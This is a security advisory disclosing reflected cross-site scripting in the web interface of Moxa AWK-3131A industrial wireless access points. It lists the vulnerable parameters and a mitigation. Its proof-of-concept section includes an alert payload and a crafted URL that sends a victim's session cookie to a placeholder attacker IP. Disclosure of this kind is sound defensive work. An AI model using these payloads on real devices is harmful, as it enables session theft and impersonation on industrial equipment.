<http://www.moxa.com/product/AWK-3131A.htm>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

### Details

An exploitable Reflected Cross-Site Scripting (XSS) vulnerability exists in the Web Application functionality of Moxa AWK-3131A Series Industrial IEEE 802.11a/b/g/n wireless AP/bridge/client. Specially crafted input, in multiple parameters, can cause a malicious scripts to be executed by a victim.

The following parameters have been validated as being vulnerable to XSS exploitation:
- devIndex parameter in client\_list.asp
- devIndex parameter in multiple\_ssid\_set.asp
- index parameter in wireless\_cert.asp
- vapIndex parameter in wireless\_security.asp

In testing, it was possible to inject JavaScript which allowed an attacker to steal legitimate session tokens, allowing the attacker to impersonate an authenticated user.

### Exploit Proof-of-Concept

Basic PoC
In multiple\_ssid\_set.asp, devIndex parameter, JavaScript preceded by `";` and closed with `%2f%2f`

```
";alert(1)%2f%2f

```

Stealing Session Tokens
The URL below will send an authenticated user’s valid session token to the attacker:

```
http://<device IP>//wireless_cert.asp?index=?index=%22%3E%3Cscript%3Ewindow.location=%22http://<attacker IP>/test?cookie=%22.concat%28document.cookie%29%3C/script%3E

```
### Mitigation

To significantly mitigate risk of exploitation, disable the web application before the device is deployed.
